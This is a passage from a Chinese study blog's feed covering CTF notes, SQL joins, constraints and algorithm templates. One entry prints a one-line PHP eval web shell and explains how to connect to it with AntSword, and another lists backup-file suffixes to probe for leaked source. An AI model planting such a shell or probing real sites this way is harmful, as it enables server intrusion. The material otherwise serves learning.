      <link href="/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80/"/>
      <url>/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80/</url>
      
        <content type="html"><![CDATA[<h1 id="常见网站源码备份文件后缀"><a href="#常见网站源码备份文件后缀" class="headerlink" title="常见网站源码备份文件后缀"></a>常见网站源码备份文件后缀</h1><ol><li>“.git” 、“.svn”、“ .swp” “.~”、“.bak”、“.bash_history”、“.bkf”、“.zip”</li><li>也可以是：</li><li><img src="https://img2020.cnblogs.com/blog/2556426/202201/2556426-20220118162112250-42073699.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 网站备份漏洞 </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> CTF </tag>
            
            <tag> 网站备份漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webshell</title>
      <link href="/webshell/"/>
      <url>/webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h1><ol><li>webshell是以asp,php,jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理，服务器管理，权限管理等操作。<h2 id="webshell是一种通过上传脚本就可以管理网站和服务器的环境，很方便。但如果不注意安全控制，也会方便了黑客入侵。"><a href="#webshell是一种通过上传脚本就可以管理网站和服务器的环境，很方便。但如果不注意安全控制，也会方便了黑客入侵。" class="headerlink" title="webshell是一种通过上传脚本就可以管理网站和服务器的环境，很方便。但如果不注意安全控制，也会方便了黑客入侵。"></a>webshell是一种通过上传脚本就可以管理网站和服务器的环境，很方便。但如果不注意安全控制，也会方便了黑客入侵。</h2><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1></li><li><?php @eval($POST['value']);?></li><li>其中eval函数将括号内的代码通过php语言执行，而括号内就是通过post方式传递一个名为value的表单，加上@后忽略了服务器的报错</li></ol><h1 id="用蚁剑链接webshell"><a href="#用蚁剑链接webshell" class="headerlink" title="用蚁剑链接webshell"></a>用蚁剑链接webshell</h1><ol><li>右击添加数据</li><li>给出url和密码</li><li><img src="https://img-blog.csdnimg.cn/b30d18e590d3438ca8276d7869bc557e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20yYTMxODE=,size_16,color_FFFFFF,t_70"></li><li>如果连接不上记得将默认字符集修改为base64等</li></ol>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
          <category> CTF </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>火狐浏览器禁止js</title>
      <link href="/%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8%E7%A6%81%E7%94%A8js/"/>
      <url>/%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8%E7%A6%81%E7%94%A8js/</url>
      
        <content type="html"><![CDATA[<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><ol><li>火狐浏览器搜索about:config</li></ol><h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><ol><li>跳转之后选择接受风险并继续</li></ol><h1 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h1><ol><li>在搜索框中搜索javascript</li></ol><h1 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h1><ol><li>将JavaScript enabled更换为false</li></ol>]]></content>
      
      
      <categories>
          
          <category> 浏览器 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白帽子sql注入</title>
      <link href="/%E7%99%BD%E5%B8%BD%E5%AD%90sql%E6%B3%A8%E5%85%A5/"/>
      <url>/%E7%99%BD%E5%B8%BD%E5%AD%90sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><h2 id="不同的字符编码也会导致出现一些安全问题"><a href="#不同的字符编码也会导致出现一些安全问题" class="headerlink" title="不同的字符编码也会导致出现一些安全问题"></a>不同的字符编码也会导致出现一些安全问题</h2><h3 id="sql语法中用单引号”‘“作为转义字符"><a href="#sql语法中用单引号”‘“作为转义字符" class="headerlink" title="sql语法中用单引号”‘“作为转义字符"></a>sql语法中用单引号”‘“作为转义字符</h3><ol><li>insert into person(LastName) values(‘O’’R’)</li><li>则输出结果为O’R</li></ol><h3 id="php中的转义为"><a href="#php中的转义为" class="headerlink" title="php中的转义为\"></a>php中的转义为\</h3><h2 id="如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节"><a href="#如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节" class="headerlink" title="如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节"></a>如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节</h2><ol><li>0x 5c和0x bf 5c会被认为是一个字符（双字节字符）</li></ol><h2 id="要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异"><a href="#要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异" class="headerlink" title="要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异"></a>要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异</h2><ol><li>统一设置为utf-8是一个很好的办法</li></ol><h1 id="mysql中环境变量sql-mode"><a href="#mysql中环境变量sql-mode" class="headerlink" title="mysql中环境变量sql_mode"></a>mysql中环境变量sql_mode</h1><ol><li>定义了mysql应该支持的sql语法，数据校验等</li><li>默认为null，这种设置下可以允许一些非法操作，比如允许一些非法数据的插入</li><li>在生产环境下必须设置为严格模式<h2 id="sql-mode常用来解决的几类问题"><a href="#sql-mode常用来解决的几类问题" class="headerlink" title="sql_mode常用来解决的几类问题"></a>sql_mode常用来解决的几类问题</h2></li><li>通过设置sql_mode，可以完成不同严格程度的数据校验，有效地保证数据准确性；</li><li>通过设置sql_mode为宽松模式，来保证大多数sql符合标准的sql语法，这样应用在不同数据库之间进行迁移时。则不需要对业务sql进行较大的修改；</li><li>在不同数据库之间进行数据迁移之前，通过设置sql_mode可以使MySQL上的数据更方便地迁移到目标数据库中<h2 id="sql-mode包含的模式"><a href="#sql-mode包含的模式" class="headerlink" title="sql_mode包含的模式"></a>sql_mode包含的模式</h2></li><li>ansi模式：宽松模式，对插入数据进行校验，如果不符合定义类型或长度，对数据类型调整或截断保存，爆warning警告</li><li>traditional模式：严格模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，爆error错误</li><li>strict_trans_tables模式：严格模式，进行数据的严格校验，错误数据不能插入，爆error错误</li></ol><h3 id="查看sql-mode的语句："><a href="#查看sql-mode的语句：" class="headerlink" title="查看sql_mode的语句："></a>查看sql_mode的语句：</h3><ol><li><p>use database_name;</p></li><li><p>select @@sql_mode;</p></li><li><p>或者</p></li><li><p>use data_basename;</p></li><li><p>show variables like ‘%sql_mode%’;</p></li><li><p><a href="https://imgtu.com/i/LmrvjS"><img src="https://s1.ax1x.com/2022/04/12/LmrvjS.png" alt="LmrvjS.png"></a></p></li><li><p>结论：在STRICT_TRANS_TABLES模式下，插入数据时，mysql会严格的进行数据的校验，当发现插入列值未满足要求，直接报告error错误，保证了错误数据无法插入到数据库中</p></li><li><p>结论：</p></li><li><p>严格模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，报error错误，而不仅仅是警告。用于事务时，会进行事务的回滚。</p></li><li><p>一旦发现错误立即放弃INSERT/UPDATE。如果你使用非事务存储引擎，这种方式不是你想要的，因为出现错误前进行的数据更改不会“滚动”，结果是更新“只进行了一部分”。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql查询</title>
      <link href="/sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/"/>
      <url>/sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>from字句后面的表名，可以用表原名，也可以为它起别名，一旦有了别名，整个查询语句中凡是涉及用表明的地方都要用表原名</li><li>查询语句中出现的所有列，若在所有涉及的表中是唯一的，则列明前可以不加表明前缀</li><li>如果不是唯一的，为了确定它的唯一性，<strong>必须在列名前假表名前缀</strong></li></ol><h2 id="等值连接和非等值连接"><a href="#等值连接和非等值连接" class="headerlink" title="等值连接和非等值连接"></a>等值连接和非等值连接</h2><ol><li>两个表进行连接时，必须要有可比字段，两个可比字段的值进行逐一比较来决定当前两个元组是否可以连接<pre class="line-numbers language-none"><code class="language-none">select student.*,SC.*from student,SCwhere student.sno &#x3D; SC.sno;select SC.sno,SC.score,SG.gradefrom SC,SGwhere SC.score BETWEEN SG.minscore AND SG.maxscore;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h2><h3 id="显示内连接"><a href="#显示内连接" class="headerlink" title="显示内连接"></a>显示内连接</h3><ol><li>on来连接两个连接列，where中写连接条件</li><li>显示内连接用inner join<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1 inner join 表2on 表1.连接列&#x3D;表2.连接列where 查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="隐式内连接"><a href="#隐式内连接" class="headerlink" title="隐式内连接"></a>隐式内连接</h3><ol><li>where写连接列，and后跟条件</li><li>隐式内连接用’=’<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1，表2where 表1.连接字段&#x3D;表2.连接字段and 其它查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><h3 id="左外连接"><a href="#左外连接" class="headerlink" title="左外连接"></a>左外连接</h3><ol><li>以左边的表为基础，根据ON后面给出的两表的条件将两表连接起来</li><li>结果会将左表所有查询信息列出，右表只会列出ON后条件和左表满足的部分</li><li>语句left join… on<pre class="line-numbers language-none"><code class="language-none">select a.device_id,question_id,result,level,gender,agefrom(    select device_id,question_id,result,level    from question_practice_detail)a-表别名left join(    select device_id,gender,age    from user_profile)b-表别名on a.device_id&#x3D;b.device_id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/14/MH8AP7neVJtcExF.png"><h3 id="左外连接的注意事项"><a href="#左外连接的注意事项" class="headerlink" title="左外连接的注意事项"></a>左外连接的注意事项</h3></li><li>在使用left join时，写在前面的表为匹配时的底表，使用on给出匹配条件，<strong>匹配条件可以不唯一</strong></li><li>在表匹配时，一般我们会将要匹配的两段查询用括号括起来，并在<strong>括号末尾给予一串字母</strong>，作为表的别名</li></ol><h4 id="左外连接例题"><a href="#左外连接例题" class="headerlink" title="左外连接例题"></a>左外连接例题</h4><pre class="line-numbers language-none"><code class="language-none">select    university,    difficult_level,    round(count(qpd.question_id) &#x2F; count(distinct qpd.device_id),4) as avg_answer_cnt-- round(x,4)将x四舍五入至小数点后四位    from question_practice_detail as qpdleft join user_profile as upon up.device_id&#x3D;qpd.device_idleft join question_detail as qdon qd.question_id&#x3D;qpd.question_idgroup by university,difficult_level;-- group by university按学校分组，group by difficult_level按不同难度的用户平均答题量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/14/H3ScumMxIbJQnBT.png"><br><img src="https://s2.loli.net/2022/05/14/2gbWteK8NRLpX3Y.png"></p><h3 id="右外连接"><a href="#右外连接" class="headerlink" title="右外连接"></a>右外连接</h3><ol><li>左外连接的反向连接<pre class="line-numbers language-none"><code class="language-none">Select a.device_id,question_id,result,level,gender,agefrom(Select device_id,gender,ageFrom user_profile)a -- 表别名Right join(Select device_id,question_id,result,levelFrom question_practice_detail)b -- 表别名On a.device_id &#x3D; b.device_id —给出链接条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="全外连接"><a href="#全外连接" class="headerlink" title="全外连接"></a>全外连接</h3></li><li>将左右两个表先左外连接，在右外连接，然后两个结果并在一起<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1 full join 表2on 表1.链接列&#x3D;表2.链接列where 查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="自身链接"><a href="#自身链接" class="headerlink" title="自身链接"></a>自身链接</h3><ol><li>链接操作不仅可以在多个表之间进行链接，而且可以时一个表与其自身进行连接，这样的表称为自身连接</li><li>因为两个表的表名和列名都相同，为了加以区分，必须给他们起两个别名，且各列前<strong>必须要有****表别名前缀</strong><pre class="line-numbers language-none"><code class="language-none">select FIRST.cno,SECOND.cpnofrom course FIRST inner join course SECONDon FIRST.cpno &#x3D; SECOND.cno;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><ol><li>在写表和表的连接关系时，大多数情况下都必须要限制匹配条件，如果在匹配时没有限制匹配条件，这时就会导致笛卡尔积。</li><li>笛卡尔积时关系代数里一个概念，表示两个表中的每一行数据任意组合</li><li>假设A中有n行数据，b中有m行数据，没有限制匹配条件的话，最终输出的结果就会有n*m行数据</li><li>在互联网大体量数据情况下，每个表 可能有几百万几千万行数据，几千万*几千万最终得到的结果行数会是天文数字，所以在写匹配时，一定不要忘了加上匹配条件。</li></ol><h1 id="全称量词命题和存在量词命题"><a href="#全称量词命题和存在量词命题" class="headerlink" title="全称量词命题和存在量词命题"></a>全称量词命题和存在量词命题</h1><p><img src="https://s2.loli.net/2022/05/15/C8n7jA3FNu4BTcI.png"><br><img src="https://s2.loli.net/2022/05/15/jnP8qkXrQzlxcJ7.png"></p><h1 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h1><h2 id="嵌套查询的工作方式"><a href="#嵌套查询的工作方式" class="headerlink" title="嵌套查询的工作方式"></a>嵌套查询的工作方式</h2><ol><li>先处理内查询，由内向外处理</li><li>外层查询利用内层查询的结果<br><img src="https://s2.loli.net/2022/05/15/GIv4x7RsuibCVPM.png"><pre class="line-numbers language-none"><code class="language-none">select tag,count(tag) as tag_cntfrom exam_recordjoin examination_info on exam_record.exam_id &#x3D; examination_info.exam_idwhere uid in (    select uid    from exam_record    where submit_time is not null    group by score    having count(exam_id) &#x2F; count(distinct DATE_FORMAT(start_time,&quot;%Y%m&quot;)) &gt;&#x3D; 3)group by tagorder by tag_cnt desc;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/b49OdtZRJVKMaox.png"><br><img src="https://s2.loli.net/2022/05/15/1pJmxVgWicM7wB2.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数二分</title>
      <link href="/%E4%BA%8C%E5%88%86%E5%88%A4%E6%96%AD%E5%89%8D%E5%90%8E%E8%BE%B9%E7%95%8C/"/>
      <url>/%E4%BA%8C%E5%88%86%E5%88%A4%E6%96%AD%E5%89%8D%E5%90%8E%E8%BE%B9%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="整数二分步骤"><a href="#整数二分步骤" class="headerlink" title="整数二分步骤"></a>整数二分步骤</h1><ol><li>找一个区间l,r，使得答案一定在该区间中</li><li>找一个判断条件，使得该判断条件具有二段性，并且答案一定是在该二段性的分界点</li><li>分析终点M在该判断条件下是否成立，如果成立，考虑答案在哪个区间，如果不成立，考虑答案在哪个区间（答案一定落在M上））</li><li>如果更新方式是￥R=mid 则不用做任何处理，如果L=mid,则需要在计算mid时+1</li><li>我的想法：L=mid，终点落在L上，则判断为左边界</li><li>R=mid，终点落在R上，则判断为右边界</li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dfs深度优先遍历模板</title>
      <link href="/dfs%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86%E6%A8%A1%E6%9D%BF/"/>
      <url>/dfs%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="dfs模板"><a href="#dfs模板" class="headerlink" title="dfs模板"></a>dfs模板</h1><pre><code>    void dfs()&#123;//参数用来表示状态        if(到达终点状态)&#123;        //根据题意任意添加        return;    &#125;    if(越界或不合法状态)&#123;        return;    &#125;    if(特殊状态)&#123;//剪枝        return;    &#125;    for(拓展方式)&#123;        if(拓展方式所到达状态合法)&#123;            修改操作;           标记;            dfs(更深层的递归)            还原标记;          //是否还原根据题意         //如果加上（还原标记）则是回溯法        &#125;    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf图片合成问题</title>
      <link href="/%E5%9B%BE%E7%89%87%E5%90%88%E6%88%90%E9%97%AE%E9%A2%98/"/>
      <url>/%E5%9B%BE%E7%89%87%E5%90%88%E6%88%90%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="图片合成问题"><a href="#图片合成问题" class="headerlink" title="图片合成问题"></a>图片合成问题</h1><h2 id="攻防世界what-is-this"><a href="#攻防世界what-is-this" class="headerlink" title="攻防世界what_is_this"></a>攻防世界what_is_this</h2><ol><li>给出两张相像的图片</li><li>使用stegsolve中的image combiner</li><li><a href="https://imgtu.com/i/qOwZaF"><img src="https://s1.ax1x.com/2022/04/05/qOwZaF.png" alt="qOwZaF.png"></a></li><li><a href="https://imgtu.com/i/qOwe54"><img src="https://s1.ax1x.com/2022/04/05/qOwe54.png" alt="qOwe54.png"></a></li><li>其实也可以使用comapre去比较</li><li>compare pic1.jpg pic2.jpg -compose src diff.png</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>w3school手册</title>
      <link href="/w3school%E5%9C%B0%E5%9D%80/"/>
      <url>/w3school%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="w3school手册地址"><a href="#w3school手册地址" class="headerlink" title="w3school手册地址"></a>w3school手册地址</h1><ol><li><a href="https://www.w3school.com.cn/sql/index.asp">https://www.w3school.com.cn/sql/index.asp</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> w3school </category>
          
      </categories>
      
      
        <tags>
            
            <tag> w3school </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>insert插入操作</title>
      <link href="/insert%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C/"/>
      <url>/insert%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li><p>INSERT和VALUES之间不能有分号</p></li><li><p>最后一个参数的后面不能用逗号隔开</p><pre><code> INSERT INTO actor(     actor_id,     first_name,     last_name,     last_update ) VALUES(1,&#39;PENELOPE&#39;,&#39;GUINESS&#39;,&#39;2006-02-15 12:34:33&#39;),     (2,&#39;NICK&#39;,&#39;WAHLBERG&#39;,&#39;2006-02-15 12:34:33&#39;);</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql语句中change和modify的区别</title>
      <link href="/sql%E8%AF%AD%E5%8F%A5%E4%B8%ADchange%E5%92%8Cmodify%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/sql%E8%AF%AD%E5%8F%A5%E4%B8%ADchange%E5%92%8Cmodify%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h1><ol><li>都可以修改表的定义</li></ol><h1 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h1><ol><li>change后面需要写两次列名，但是可以修改列的名称</li><li>modify只需要写一次列明，但是不能修改列的名称</li></ol><h1 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h1><ol><li>ALTER TABLE table.name MODIFY column.name COLUMN_DEFINATION</li><li>alter table test1 modify ename varchar(20);</li><li>上面的是将test1表中的ename字段定义，将varchar(10)改为varchar(20)<h2 id="字段改名："><a href="#字段改名：" class="headerlink" title="字段改名："></a>字段改名：</h2></li><li>ALTER TABLE tablename CHANGE[COLUMN] old_column_name column_defination</li><li>将ename改为enmaeq,同时修改字段类型int(3)为int(4)</li><li>alter table test1 change ename ename1 int(4);</li><li>两次列的名字分别为改前和改后的</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql中的NUMBER数据类型</title>
      <link href="/sql%E4%B8%ADnumber%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/sql%E4%B8%ADnumber%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="NUMBER"><a href="#NUMBER" class="headerlink" title="NUMBER"></a>NUMBER</h1><ol><li>可以存储零值，正负数，定长数</li></ol><h2 id="表示范围和存储空间"><a href="#表示范围和存储空间" class="headerlink" title="表示范围和存储空间"></a>表示范围和存储空间</h2><ol><li>从从1.0 x 10-130 到 1.0 x 10126(不包括)，如果表达式或值大于1.0 x 10126，Oracle会返回错误信息</li></ol><h2 id="NUMBER类型表示方法"><a href="#NUMBER类型表示方法" class="headerlink" title="NUMBER类型表示方法"></a>NUMBER类型表示方法</h2><ol><li>number(p,s) p和s可选</li><li>其中p表示数字的总长度，s表示可以有几位小数</li><li>precision叫精度，数中总数字的个数，默认为38位</li><li>scale是小数位数，即数中小数点右边的数字个数</li></ol><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ol><li>number数据类型只存在于Oracle中，不存在于MySQL中</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql中表级别的约束和列级别的约束</title>
      <link href="/sql%E4%B8%AD%E8%A1%A8%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%92%8C%E5%88%97%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F/"/>
      <url>/sql%E4%B8%AD%E8%A1%A8%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%92%8C%E5%88%97%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="sql中表级别的约束和列级别的约束"><a href="#sql中表级别的约束和列级别的约束" class="headerlink" title="sql中表级别的约束和列级别的约束"></a>sql中表级别的约束和列级别的约束</h1><h2 id="列级别的约束有六种："><a href="#列级别的约束有六种：" class="headerlink" title="列级别的约束有六种："></a>列级别的约束有六种：</h2><ol><li>primary key</li><li>foreign key</li><li>unique</li><li>check</li><li>default</li><li>not null/null</li></ol><h1 id="表级别的约束"><a href="#表级别的约束" class="headerlink" title="表级别的约束"></a>表级别的约束</h1><ol><li>主键</li><li>外键</li><li>唯一</li><li>检查</li></ol><h1 id="列约束的定义"><a href="#列约束的定义" class="headerlink" title="列约束的定义"></a>列约束的定义</h1><ol><li><p>直接跟在该列的其他定义之后，用空格分割，不必指定列名</p></li><li><p>表约束和列定义相互独立，不包括在列定义中，通常用于对多个列一起进行约束，与列定义用“，”分割，定义表约束时必须指出要约束的哪些列的名称，完整性约束的基本语法格式时[CONSTANT &lt;约束名&gt;] &lt;约束类型&gt;</p><pre><code> CREATE TABLE g1 &#123;     g_id CHAR(6) PRIMARY KEY     g_name VARCHAR(20) &#125;</code></pre><p>或</p><pre><code> CREATE TABLE stu &#123;     s_id CHAR(10)     CONSTRAINT pk PRIMARY KEY(s_id) &#125;</code></pre></li></ol><h1 id="完整性概念"><a href="#完整性概念" class="headerlink" title="完整性概念"></a>完整性概念</h1><h2 id="域完整性"><a href="#域完整性" class="headerlink" title="域完整性"></a>域完整性</h2><ol><li>域完整性是对数据表中字段属性的约束<h2 id="实体完整性"><a href="#实体完整性" class="headerlink" title="实体完整性"></a>实体完整性</h2></li><li>通过主键约束和候选键约束实现<h2 id="参照完整性"><a href="#参照完整性" class="headerlink" title="参照完整性"></a>参照完整性</h2></li><li>MySQL中的外键</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql常见的建表选项和约束</title>
      <link href="/mysql%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BB%BA%E8%A1%A8%E9%80%89%E9%A1%B9%E5%92%8C%E7%BA%A6%E6%9D%9F/"/>
      <url>/mysql%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BB%BA%E8%A1%A8%E9%80%89%E9%A1%B9%E5%92%8C%E7%BA%A6%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="create-table选项"><a href="#create-table选项" class="headerlink" title="create table选项"></a>create table选项</h1><h2 id="指定列选项：default"><a href="#指定列选项：default" class="headerlink" title="指定列选项：default"></a>指定列选项：default</h2><ol><li>当插入一个新行到表中并且没有给该列明确赋值时，如果定义了列的默认值，将自动得到默认值 ；如果没有，则为null。</li><li>sex char(1) default ‘m’</li><li>当然，也可以在INSERT和UPDATE语句中使用DEFAULT关键字显式地给列赋默认值：</li><li>函数default(column)可以得到一个列的默认值：select default(sex) from people;</li></ol><h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><ol><li>用来给列加注释，最多255个字符，注释会保存到数据字典中</li><li>id int not null primary key</li><li><pre><code>comment &#39;学号&#39;</code></pre><h3 id="从数据字典中查询注释信息"><a href="#从数据字典中查询注释信息" class="headerlink" title="从数据字典中查询注释信息"></a>从数据字典中查询注释信息</h3></li><li>select column_name,column_comment</li><li>from information_schema.columns</li><li>where table_name=’stu_comment’</li></ol><h1 id="在CREATE-TABLES语句中的表选项"><a href="#在CREATE-TABLES语句中的表选项" class="headerlink" title="在CREATE TABLES语句中的表选项"></a>在CREATE TABLES语句中的表选项</h1><h2 id="engine-指定表使用的存储引擎"><a href="#engine-指定表使用的存储引擎" class="headerlink" title="engine:指定表使用的存储引擎"></a>engine:指定表使用的存储引擎</h2><ol><li>存储引擎：决定了数据如何存储以及如何访问，还有事务如何处理</li><li>show engines 用来查询所有支持的存储引擎</li></ol><h1 id="CREATE-TABLE约束"><a href="#CREATE-TABLE约束" class="headerlink" title="CREATE TABLE约束"></a>CREATE TABLE约束</h1><h2 id="作用：可以为列定义约束"><a href="#作用：可以为列定义约束" class="headerlink" title="作用：可以为列定义约束"></a>作用：可以为列定义约束</h2><ol><li>约束主要是防止非法数据进入表中，保证数据的正确性和一致性，统称为数据完整性</li><li>约束也可以防止一个表被删除</li></ol><h2 id="MySQL的约束保存在information-schema-table-constraints中，可以通过该表查询约束信息"><a href="#MySQL的约束保存在information-schema-table-constraints中，可以通过该表查询约束信息" class="headerlink" title="MySQL的约束保存在information_schema.table_constraints中，可以通过该表查询约束信息"></a>MySQL的约束保存在information_schema.table_constraints中，可以通过该表查询约束信息</h2><h2 id="常见的约束类型"><a href="#常见的约束类型" class="headerlink" title="常见的约束类型"></a>常见的约束类型</h2><ol><li>not 